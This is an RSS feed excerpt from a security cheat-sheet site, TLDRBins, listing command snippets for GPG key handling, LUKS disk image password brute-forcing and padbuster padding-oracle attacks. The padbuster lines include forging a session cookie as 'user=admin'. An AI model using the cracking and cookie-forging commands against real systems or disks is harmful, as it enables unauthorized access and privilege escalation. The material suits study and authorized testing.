channel.title: Encryption on TLDRBins
channel.description: Recent content in Encryption on TLDRBins

item.title: GPG
item.description: Basic # Check Version gpg --version # Generate New Key gpg --gen-key # Export Private Key gpg --homedir <GNUPG_DIR> --export-secret-keys --armor > key.asc # Export Public Key gpg --export -a <USER>@<DOMAIN> # Check Keys gpg --list-keys # Import Public Key gpg --import <PUB_KEY> # Encrypt a Message with Public Key (Email from PubKey) gpg --encrypt --armor -r <USER>@<DOMAIN> <FILE> # Decrypt a Message with Our Private Key gpg --homedir <GNUPG_DIR> -d <ENC_FILE> # Sign Our Own Message gpg --clearsign --output - <FILE>

item.title: Linux hard disk encryption
item.description: Brute force LUKS password bruteforce-luks -t 10 -f <WORDLIST> -w state.txt -v 30 <BACKUP_IMG> Note: This is slow, create a small wordlist Basic # Open cryptsetup open --type luks <BACKUP_IMG> backup # Check ls -l /dev/mapper/ # Create mount folder sudo mkdir /mnt/backup # Mount sudo mount /dev/mapper/backup /mnt/backup/

item.title: Padding Oracle
item.description: Tools padbuster # 8 or 16 : block size # encoding 0 : base64 padbuster http://<TARGET>/index.php <COOKIE_VALUE> 8 -cookies <COOKIE_NAME>=<COOKIE_VALUE> -encoding 0 # Forge cookie value, e.g. user=admin padbuster http://<TARGET>/index.php <COOKIE_VALUE> 8 -cookies <COOKIE_NAME>=<COOKIE_VALUE> -encoding 0 -plaintext user=admin Ref: Download padbuster
